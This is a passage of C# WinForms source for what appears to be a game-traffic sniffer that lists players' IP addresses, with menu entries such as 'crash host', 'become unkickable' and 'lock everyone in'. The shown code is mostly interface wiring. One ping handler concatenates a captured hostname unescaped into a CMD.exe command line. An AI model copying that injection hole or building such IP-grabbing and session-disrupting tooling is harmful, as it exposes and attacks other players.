		Pcdecryption.AutoSizeRowsMode = DataGridViewAutoSizeRowsMode.None;
		Pcdecryption.DefaultCellStyle.WrapMode = DataGridViewTriState.True;
		dataGridView1.AutoSizeRowsMode = DataGridViewAutoSizeRowsMode.None;
	}

	private void panel2_LocationChanged(object sender, EventArgs e)
	{
	}

	private void packetAnalyzerToolStripMenuItem_Click_1(object sender, EventArgs e)
	{
		if (dataGridView1.SelectedCells.Count > 0)
		{
			string selectedIP = dataGridView1.SelectedCells[5].Value?.ToString() ?? string.Empty;
			if (dataGridView1.SelectedCells[6].Value?.ToString() == null)
			{
				_ = string.Empty;
			}
			if (!string.IsNullOrEmpty(selectedIP))
			{
				PacketAnalyzer packetAnalyzer = new PacketAnalyzer(_packets[selectedIP].ToList())
				{
					StartPosition = FormStartPosition.Manual
				};
				packetAnalyzer.Location = new Point(base.Location.X + (base.Width - packetAnalyzer.Width) / 2, base.Location.Y + (base.Height - packetAnalyzer.Height) / 2);
				packetAnalyzer.ShowDialog(this);
			}
			else
			{
				ShowNotification("The selected cell does not contain a valid IP address.");
			}
		}
		else
		{
			ShowNotification("Please select a cell with an IP address.");
		}
	}

	private void packetAnalyzerToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (guna2DataGridView5.SelectedCells.Count > 0)
		{
			string selectedIP = guna2DataGridView5.SelectedCells[2].Value?.ToString() ?? string.Empty;
			if (!string.IsNullOrEmpty(selectedIP))
			{
				PacketAnalyzer packetAnalyzer = new PacketAnalyzer(_packets[selectedIP].ToList())
				{
					StartPosition = FormStartPosition.Manual
				};
				packetAnalyzer.Location = new Point(base.Location.X + (base.Width - packetAnalyzer.Width) / 2, base.Location.Y + (base.Height - packetAnalyzer.Height) / 2);
				packetAnalyzer.ShowDialog(this);
			}
			else
			{
				ShowNotification("The selected cell does not contain a valid IP address.");
			}
		}
		else
		{
			ShowNotification("Please select a cell with an IP address.");
		}
	}

	private void packetAnalyzerToolStripMenuItem2_Click(object sender, EventArgs e)
	{
		if (guna2DataGridView3.SelectedCells.Count > 0)
		{
			string selectedIP = guna2DataGridView3.SelectedCells[2].Value?.ToString() ?? string.Empty;
			if (!string.IsNullOrEmpty(selectedIP))
			{
				PacketAnalyzer packetAnalyzer = new PacketAnalyzer(_packets[selectedIP].ToList())
				{
					StartPosition = FormStartPosition.Manual
				};
				packetAnalyzer.Location = new Point(base.Location.X + (base.Width - packetAnalyzer.Width) / 2, base.Location.Y + (base.Height - packetAnalyzer.Height) / 2);
				packetAnalyzer.ShowDialog(this);
			}
			else
			{
				ShowNotification("The selected cell does not contain a valid IP address.");
			}
		}
		else
		{
			ShowNotification("Please select a cell with an IP address.");
		}
	}

	private void guna2TextBox3_TextChanged(object sender, EventArgs e)
	{
	}

	private void Mainform_Move(object sender, EventArgs e)
	{
	}

	private void dataGridView1_MouseMove(object sender, MouseEventArgs e)
	{
		DataGridView.HitTestInfo hit = dataGridView1.HitTest(e.X, e.Y);
		if (hit.RowIndex >= 0)
		{
			for (int i = 0; i < dataGridView1.Rows.Count; i++)
			{
				dataGridView1.Rows[i].DefaultCellStyle.BackColor = Color.Black;
			}
			dataGridView1.Rows[hit.RowIndex].DefaultCellStyle.BackColor = Color.FromArgb(25, 25, 25);
		}
	}

	private void dataGridView1_MouseLeave(object sender, EventArgs e)
	{
		foreach (DataGridViewRow item in (IEnumerable)dataGridView1.Rows)
		{
			item.DefaultCellStyle.BackColor = Color.Black;
		}
	}

	private void SetRowHoverColor(Guna2DataGridView dgv, int hoveredRowIndex)
	{
		for (int i = 0; i < dgv.Rows.Count; i++)
		{
			dgv.Rows[i].DefaultCellStyle.BackColor = Color.Black;
		}
		if (hoveredRowIndex >= 0)
		{
			dgv.Rows[hoveredRowIndex].DefaultCellStyle.BackColor = Color.FromArgb(25, 25, 25);
		}
	}

	private void ResetRowColors(Guna2DataGridView dgv)
	{
		foreach (DataGridViewRow item in (IEnumerable)dgv.Rows)
		{
			item.DefaultCellStyle.BackColor = Color.Black;
		}
	}

	private void guna2DataGridView_MouseMove(object sender, MouseEventArgs e)
	{
		Guna2DataGridView dgv = sender as Guna2DataGridView;
		DataGridView.HitTestInfo hit = dgv.HitTest(e.X, e.Y);
		SetRowHoverColor(dgv, hit.RowIndex);
	}

	private void guna2CircleButton3_Click(object sender, EventArgs e)
	{
		Geo menu = new Geo();
		menu.StartPosition = FormStartPosition.Manual;
		menu.Location = new Point(base.Location.X + (base.Width - menu.Width) / 2, base.Location.Y + (base.Height - menu.Height) / 2);
		menu.ShowDialog(this);
		base.Enabled = true;
	}

	private void guna2CircleButton1_Click(object sender, EventArgs e)
	{
		InitializeAdapterComboBox();
	}

	private void toolStripMenuItem3_Click(object sender, EventArgs e)
	{
		if (Pcdecryption.SelectedRows.Count > 0)
		{
			DataGridViewRow selectedRow = Pcdecryption.SelectedRows[0];
			if (selectedRow.Cells.Count > 6)
			{
				string obj = selectedRow.Cells[2].Value.ToString();
				string cellValue2 = selectedRow.Cells[3].Value.ToString();
				Clipboard.SetText(obj + " " + cellValue2);
			}
			else
			{
				MessageBox.Show("The selected row does not have enough cells.");
			}
		}
	}

	private void toolStripMenuItem15_Click_1(object sender, EventArgs e)
	{
		if (Pcdecryption.SelectedRows.Count > 0)
		{
			DataGridViewRow selectedRow = Pcdecryption.SelectedRows[0];
			if (selectedRow.Cells.Count > 6)
			{
				string cellValue1 = selectedRow.Cells[2].Value.ToString();
				string cellValue2 = selectedRow.Cells[3].Value.ToString();
				string cellValue3 = selectedRow.Cells[4].Value.ToString();
				string cellValue4 = selectedRow.Cells[5].Value.ToString();
				string cellValue5 = selectedRow.Cells[6].Value.ToString();
				string cellValue6 = selectedRow.Cells[7].Value.ToString();
				Clipboard.SetText(cellValue1 + " " + cellValue2 + " " + cellValue3 + " " + cellValue4 + " " + cellValue5 + " " + cellValue6);
			}
			else
			{
				ShowNotification("The selected row does not have enough cells.");
			}
		}
	}

	private void toolStripMenuItem19_Click(object sender, EventArgs e)
	{
		ShowNotification("Successfully Cleared");
		Pcdecryption.Rows.Clear();
		processedIPsPC.Clear();
		Pcinfohash.Clear();
		addedIPs.Clear();
	}

	private void toolStripMenuItem20_Click(object sender, EventArgs e)
	{
		if (Pcdecryption.SelectedCells.Count > 0)
		{
			int rowIndex = Pcdecryption.SelectedCells[0].RowIndex;
			if (rowIndex >= 0 && rowIndex < Pcdecryption.Rows.Count)
			{
				foreach (DataGridViewCell cell in Pcdecryption.Rows[rowIndex].Cells)
				{
					cell.Value = "";
				}
				Pcdecryption.Rows.RemoveAt(rowIndex);
				ShowNotification("Selected row cleared successfully");
			}
			else
			{
				ShowNotification("Selected row index is out of range.");
			}
		}
		else
		{
			ShowNotification("No cells are selected.");
		}
	}

	private void toolStripMenuItem21_Click(object sender, EventArgs e)
	{
		if (Pcdecryption.SelectedCells.Count > 0)
		{
			DataGridViewCell selectedCell = Pcdecryption.SelectedCells[2];
			if (selectedCell.Value != null && !string.IsNullOrWhiteSpace(selectedCell.Value.ToString()))
			{
				string hostName = selectedCell.Value.ToString();
				string PingCMD = "/K mode con lines=25 cols=60 & ping " + hostName + " -t";
				Process.Start("CMD.exe", PingCMD);
			}
			else
			{
				ShowNotification("Please select a valid host from the DataGridView.");
			}
		}
		else
		{
			ShowNotification("Please select a valid host from the DataGridView.");
		}
	}

	private void toolStripMenuItem22_Click(object sender, EventArgs e)
	{
		if (Pcdecryption.SelectedCells.Count > 0)
		{
			string selectedIP = Pcdecryption.SelectedCells[2].Value?.ToString() ?? string.Empty;
			if (!string.IsNullOrEmpty(selectedIP))
			{
				PacketAnalyzer packetAnalyzer = new PacketAnalyzer(_packets[selectedIP].ToList())
				{
					StartPosition = FormStartPosition.Manual
				};
				packetAnalyzer.Location = new Point(base.Location.X + (base.Width - packetAnalyzer.Width) / 2, base.Location.Y + (base.Height - packetAnalyzer.Height) / 2);
				packetAnalyzer.ShowDialog(this);
			}
			else
			{
				ShowNotification("The selected cell does not contain a valid IP address.");
			}
		}
		else
		{
			ShowNotification("Please select a cell with an IP address.");
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
            this.components = new System.ComponentModel.Container();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle29 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle30 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle31 = new System.Windows.Forms.DataGridViewCellStyle();
            Guna.UI2.AnimatorNS.Animation animation4 = new Guna.UI2.AnimatorNS.Animation();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle32 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle33 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle34 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle35 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle36 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle4 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle5 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle6 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle7 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle8 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle9 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle10 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle11 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle12 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle13 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle14 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle15 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle16 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle17 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle18 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle19 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle20 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle21 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle22 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle23 = new System.Windows.Forms.DataGridViewCellStyle();
            Guna.UI2.AnimatorNS.Animation animation3 = new Guna.UI2.AnimatorNS.Animation();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Mainform));
            this.logInContextMenu2 = new LoginTheme.LogInContextMenu();
            this.copySourceIPToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.copyFullRowToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.pingCellToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.addUsernameToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
            this.pingCellToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.packetAnalyzerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.textBox7 = new System.Windows.Forms.TextBox();
            this.listView1 = new System.Windows.Forms.ListView();
            this.Label = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.IPC = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.dataGridView2 = new System.Windows.Forms.DataGridView();
            this.logInButton2 = new LoginTheme.LogInButton();
            this.panel1 = new System.Windows.Forms.Panel();
            this.logInGroupBox1 = new LoginTheme.LogInGroupBox();
            this.logInLabel3 = new LoginTheme.LogInLabel();
            this.logInNormalTextBox1 = new LoginTheme.LogInNormalTextBox();
            this.logInLabel4 = new LoginTheme.LogInLabel();
            this.logInNormalTextBox2 = new LoginTheme.LogInNormalTextBox();
            this.logInLabel5 = new LoginTheme.LogInLabel();
            this.asdasd = new LoginTheme.LogInNormalTextBox();
            this.logInLabel6 = new LoginTheme.LogInLabel();
            this.logInNormalTextBox4 = new LoginTheme.LogInNormalTextBox();
            this.logInGroupBox2 = new LoginTheme.LogInGroupBox();
            this.logInLabel1 = new LoginTheme.LogInLabel();
            this.logInComboBox2 = new LoginTheme.LogInComboBox();
            this.logInLabel2 = new LoginTheme.LogInLabel();
            this.logInComboBox3 = new LoginTheme.LogInComboBox();
            this.logInLabel8 = new LoginTheme.LogInLabel();
            this.logInLabel9 = new LoginTheme.LogInLabel();
            this.label1 = new System.Windows.Forms.Label();
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.label2 = new System.Windows.Forms.Label();
            this.imageList1 = new System.Windows.Forms.ImageList(this.components);
            this.logInContextMenu3 = new LoginTheme.LogInContextMenu();
            this.toolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.copyEntireRowToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem4 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
            this.pingCellToolStripMenuItem3 = new System.Windows.Forms.ToolStripMenuItem();
            this.packetAnalyzerToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.logInContextMenu6 = new LoginTheme.LogInContextMenu();
            this.toolStripMenuItem11 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem12 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem13 = new System.Windows.Forms.ToolStripMenuItem();
            this.logInContextMenu5 = new LoginTheme.LogInContextMenu();
            this.toolStripMenuItem8 = new System.Windows.Forms.ToolStripMenuItem();
            this.copyEntireRowToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem10 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem9 = new System.Windows.Forms.ToolStripMenuItem();
            this.pingCellToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
            this.packetAnalyzerToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
            this.logInContextMenu1 = new LoginTheme.LogInContextMenu();
            this.toolStripMenuItem14 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem16 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem17 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem18 = new System.Windows.Forms.ToolStripMenuItem();
            this.label6 = new System.Windows.Forms.Label();
            this.panel2 = new System.Windows.Forms.Panel();
            this.label4 = new System.Windows.Forms.Label();
            this.guna2ControlBox1 = new Guna.UI2.WinForms.Guna2ControlBox();
            this.guna2ControlBox3 = new Guna.UI2.WinForms.Guna2ControlBox();
            this.guna2ControlBox2 = new Guna.UI2.WinForms.Guna2ControlBox();
            this.logInThemeContainer1 = new LoginTheme.LogInThemeContainer();
            this.logInThemeContainer2 = new LoginTheme.LogInThemeContainer();
            this.logInThemeContainer3 = new LoginTheme.LogInThemeContainer();
            this.guna2TextBox4 = new Guna.UI2.WinForms.Guna2TextBox();
            this.guna2TextBox3 = new Guna.UI2.WinForms.Guna2TextBox();
            this.guna2HtmlToolTip1 = new Guna.UI2.WinForms.Guna2HtmlToolTip();
            this.guna2Button3 = new Guna.UI2.WinForms.Guna2Button();
            this.guna2Button5 = new Guna.UI2.WinForms.Guna2Button();
            this.guna2CircleButton3 = new Guna.UI2.WinForms.Guna2CircleButton();
            this.guna2CircleButton2 = new Guna.UI2.WinForms.Guna2CircleButton();
            this.guna2CircleButton1 = new Guna.UI2.WinForms.Guna2CircleButton();
            this.guna2Transition1 = new Guna.UI2.WinForms.Guna2Transition();
            this.guna2Panel1 = new Guna.UI2.WinForms.Guna2Panel();
            this.txtRowCount = new System.Windows.Forms.Label();
            this.panel3 = new System.Windows.Forms.Panel();
            this.guna2ComboBox1 = new Guna.UI2.WinForms.Guna2ComboBox();
            this.SniffBTN = new Guna.UI2.WinForms.Guna2Button();
            this.guna2TabControl1 = new Guna.UI2.WinForms.Guna2TabControl();
            this.filteredGamesTab = new System.Windows.Forms.TabPage();
            this.guna2VScrollBar1 = new Guna.UI2.WinForms.Guna2VScrollBar();
            this.dataGridView1 = new Guna.UI2.WinForms.Guna2DataGridView();
            this.playstationTab = new System.Windows.Forms.TabPage();
            this.guna2VScrollBar6 = new Guna.UI2.WinForms.Guna2VScrollBar();
            this.guna2DataGridView5 = new Guna.UI2.WinForms.Guna2DataGridView();
            this.Column4 = new System.Windows.Forms.DataGridViewImageColumn();
            this.dataGridViewTextBoxColumn1 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn2 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn3 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn4 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn5 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn6 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn7 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.xboxTab = new System.Windows.Forms.TabPage();
            this.guna2VScrollBar5 = new Guna.UI2.WinForms.Guna2VScrollBar();
            this.guna2DataGridView4 = new Guna.UI2.WinForms.Guna2DataGridView();
            this.Column15 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Column16 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Column17 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Column18 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Column19 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Column20 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.otherInfoTab = new System.Windows.Forms.TabPage();
            this.guna2VScrollBar4 = new Guna.UI2.WinForms.Guna2VScrollBar();
            this.guna2DataGridView3 = new Guna.UI2.WinForms.Guna2DataGridView();
            this.Column5 = new System.Windows.Forms.DataGridViewImageColumn();
            this.Column1 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Column2 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Column3 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Column8 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Column9 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Column13 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Column14 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.xblToolTab = new System.Windows.Forms.TabPage();
            this.guna2GroupBox3 = new Guna.UI2.WinForms.Guna2GroupBox();
            this.guna2Panel4 = new Guna.UI2.WinForms.Guna2Panel();
            this.guna2TextBox2 = new Guna.UI2.WinForms.Guna2TextBox();
            this.guna2Panel5 = new Guna.UI2.WinForms.Guna2Panel();
            this.guna2TextBox5 = new Guna.UI2.WinForms.Guna2TextBox();
            this.guna2Button9 = new Guna.UI2.WinForms.Guna2Button();
            this.guna2Button8 = new Guna.UI2.WinForms.Guna2Button();
            this.PcTab = new System.Windows.Forms.TabPage();
            this.Pcdecryption = new Guna.UI2.WinForms.Guna2DataGridView();
            this.dataGridViewImageColumn1 = new System.Windows.Forms.DataGridViewImageColumn();
            this.dataGridViewTextBoxColumn8 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn9 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn10 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn11 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn12 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn13 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn14 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.PcContext = new LoginTheme.LogInContextMenu();
            this.toolStripMenuItem3 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem15 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem19 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem20 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem21 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem22 = new System.Windows.Forms.ToolStripMenuItem();
            this.Functions = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.giveAchievementsbetaToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem5 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem6 = new System.Windows.Forms.ToolStripMenuItem();
            this.becomeUnkickableToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.crashHostToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem7 = new System.Windows.Forms.ToolStripMenuItem();
            this.lockEveryoneInToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.invisibleInPartyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.copyIPIfPresentToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.tabPage1 = new System.Windows.Forms.TabPage();
            this.backgroundWorker1 = new System.ComponentModel.BackgroundWorker();
            this.Ani = new Guna.UI2.WinForms.Guna2Transition();
            this.backgroundWorker2 = new System.ComponentModel.BackgroundWorker();
            this.timer2 = new System.Windows.Forms.Timer(this.components);
            this.DragControl_Form = new Guna.UI.WinForms.GunaDragControl(this.components);
            this.guna2DragControl1 = new Guna.UI2.WinForms.Guna2DragControl(this.components);
            this.guna2Elipse3 = new Guna.UI2.WinForms.Guna2Elipse(this.components);
            this.guna2Elipse12 = new Guna.UI2.WinForms.Guna2Elipse(this.components);
            this.logInContextMenu2.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.dataGridView2)).BeginInit();
            this.logInContextMenu3.SuspendLayout();
            this.logInContextMenu6.SuspendLayout();
            this.logInContextMenu5.SuspendLayout();
            this.logInContextMenu1.SuspendLayout();
            this.panel2.SuspendLayout();
            this.guna2Panel1.SuspendLayout();
            this.panel3.SuspendLayout();
            this.guna2TabControl1.SuspendLayout();
            this.filteredGamesTab.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.dataGridView1)).BeginInit();
            this.playstationTab.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.guna2DataGridView5)).BeginInit();
            this.xboxTab.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.guna2DataGridView4)).BeginInit();
            this.otherInfoTab.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.guna2DataGridView3)).BeginInit();
            this.xblToolTab.SuspendLayout();
            this.guna2GroupBox3.SuspendLayout();
            this.guna2Panel4.SuspendLayout();
            this.guna2Panel5.SuspendLayout();
            this.PcTab.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.Pcdecryption)).BeginInit();
            this.PcContext.SuspendLayout();
            this.Functions.SuspendLayout();
            this.SuspendLayout();
            // 
            // logInContextMenu2
            // 
            this.logInContextMenu2.BackColor = System.Drawing.Color.Black;
            this.guna2Transition1.SetDecoration(this.logInContextMenu2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Ani.SetDecoration(this.logInContextMenu2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.logInContextMenu2.FontColour = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            this.logInContextMenu2.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            this.logInContextMenu2.ImageScalingSize = new System.Drawing.Size(20, 20);
            this.logInContextMenu2.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.copySourceIPToolStripMenuItem,
            this.copyFullRowToolStripMenuItem,
            this.pingCellToolStripMenuItem,
            this.addUsernameToolStripMenuItem2,
            this.pingCellToolStripMenuItem1,
            this.packetAnalyzerToolStripMenuItem});
            this.logInContextMenu2.Name = "logInContextMenu2";
            this.logInContextMenu2.ShowImageMargin = false;
            this.logInContextMenu2.Size = new System.Drawing.Size(186, 148);
            this.logInContextMenu2.Opening += new System.ComponentModel.CancelEventHandler(this.logInContextMenu2_Opening);
            // 
            // copySourceIPToolStripMenuItem
            // 
            this.copySourceIPToolStripMenuItem.BackColor = System.Drawing.Color.Transparent;
            this.copySourceIPToolStripMenuItem.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.copySourceIPToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.copySourceIPToolStripMenuItem.Name = "copySourceIPToolStripMenuItem";
            this.copySourceIPToolStripMenuItem.Size = new System.Drawing.Size(185, 24);
            this.copySourceIPToolStripMenuItem.Text = "Copy To Clipboard";
            this.copySourceIPToolStripMenuItem.Click += new System.EventHandler(this.copySourceIPToolStripMenuItem_Click);
            // 
            // copyFullRowToolStripMenuItem
            // 
            this.copyFullRowToolStripMenuItem.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.copyFullRowToolStripMenuItem.Name = "copyFullRowToolStripMenuItem";
            this.copyFullRowToolStripMenuItem.Size = new System.Drawing.Size(185, 24);
            this.copyFullRowToolStripMenuItem.Text = "Copy Entire Row";
            this.copyFullRowToolStripMenuItem.Click += new System.EventHandler(this.copyFullRowToolStripMenuItem_Click);
            // 
            // pingCellToolStripMenuItem
            // 
            this.pingCellToolStripMenuItem.BackColor = System.Drawing.Color.Black;
            this.pingCellToolStripMenuItem.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.pingCellToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.pingCellToolStripMenuItem.Name = "pingCellToolStripMenuItem";
            this.pingCellToolStripMenuItem.Size = new System.Drawing.Size(185, 24);
            this.pingCellToolStripMenuItem.Text = "Clear All";
            this.pingCellToolStripMenuItem.Click += new System.EventHandler(this.pingCellToolStripMenuItem_Click);
            // 
            // addUsernameToolStripMenuItem2
            // 
            this.addUsernameToolStripMenuItem2.BackColor = System.Drawing.Color.Black;
            this.addUsernameToolStripMenuItem2.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.addUsernameToolStripMenuItem2.ForeColor = System.Drawing.Color.White;
            this.addUsernameToolStripMenuItem2.Name = "addUsernameToolStripMenuItem2";
            this.addUsernameToolStripMenuItem2.Size = new System.Drawing.Size(185, 24);
            this.addUsernameToolStripMenuItem2.Text = "Clear Selected Row";
            this.addUsernameToolStripMenuItem2.Click += new System.EventHandler(this.addUsernameToolStripMenuItem2_Click);
            // 
            // pingCellToolStripMenuItem1
            // 
            this.pingCellToolStripMenuItem1.BackColor = System.Drawing.Color.Black;
            this.pingCellToolStripMenuItem1.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.pingCellToolStripMenuItem1.ForeColor = System.Drawing.Color.White;
            this.pingCellToolStripMenuItem1.Name = "pingCellToolStripMenuItem1";
            this.pingCellToolStripMenuItem1.Size = new System.Drawing.Size(185, 24);
            this.pingCellToolStripMenuItem1.Text = "Ping Cell";
            this.pingCellToolStripMenuItem1.Click += new System.EventHandler(this.pingCellToolStripMenuItem1_Click);
            // 
            // packetAnalyzerToolStripMenuItem
            // 
            this.packetAnalyzerToolStripMenuItem.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.packetAnalyzerToolStripMenuItem.Name = "packetAnalyzerToolStripMenuItem";
            this.packetAnalyzerToolStripMenuItem.Size = new System.Drawing.Size(185, 24);
            this.packetAnalyzerToolStripMenuItem.Text = "Packet Analyzer";
            this.packetAnalyzerToolStripMenuItem.Click += new System.EventHandler(this.packetAnalyzerToolStripMenuItem_Click_1);
            // 
            // textBox7
            // 
            this.textBox7.BackColor = System.Drawing.Color.Black;
            this.textBox7.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.guna2Transition1.SetDecoration(this.textBox7, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Ani.SetDecoration(this.textBox7, Guna.UI2.AnimatorNS.DecorationType.None);
